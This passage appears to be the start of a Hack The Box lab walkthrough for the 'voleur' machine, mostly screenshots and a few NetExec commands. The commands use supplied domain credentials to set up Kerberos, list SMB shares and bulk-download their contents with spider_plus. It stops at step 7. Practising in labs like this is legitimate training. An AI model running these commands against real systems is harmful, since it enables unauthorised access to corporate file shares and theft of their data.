1.
Given Creds: ryan.naylor / HollowOct31Nyt <br>
![image](https://github.com/user-attachments/assets/a36b6035-ebc6-4f06-a52f-9e8746277e47)
![image](https://github.com/user-attachments/assets/930af8f6-3714-4f22-adc8-21485a12e467)
2.
**Command 1: nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --generate-krb5-file /home/kali/Desktop/htb/voleur/voleur.krb5** <br>
**Command 2: export KRB5_CONFIG=/home/kali/Desktop/htb/voleur/voleur.krb5** <br>
![image](https://github.com/user-attachments/assets/d8d89ad7-bb18-40b6-8a3d-c4beb9abf84a)
3.
![image](https://github.com/user-attachments/assets/622a33c9-c767-434e-b5fe-5d7693c1a465)
4.
![image](https://github.com/user-attachments/assets/6babfb30-69e8-48bd-8f84-c936404c7fdc)
5.
**Command: ./ft.sh voleur.htb nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares** <br>
![image](https://github.com/user-attachments/assets/7e44c8c1-68d1-4835-b46d-b2dba519322d)
6.
**Command: ./ft.sh voleur.htb nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True** <br>
![image](https://github.com/user-attachments/assets/1777ea98-e917-423e-b295-84631092fce6)
7.



































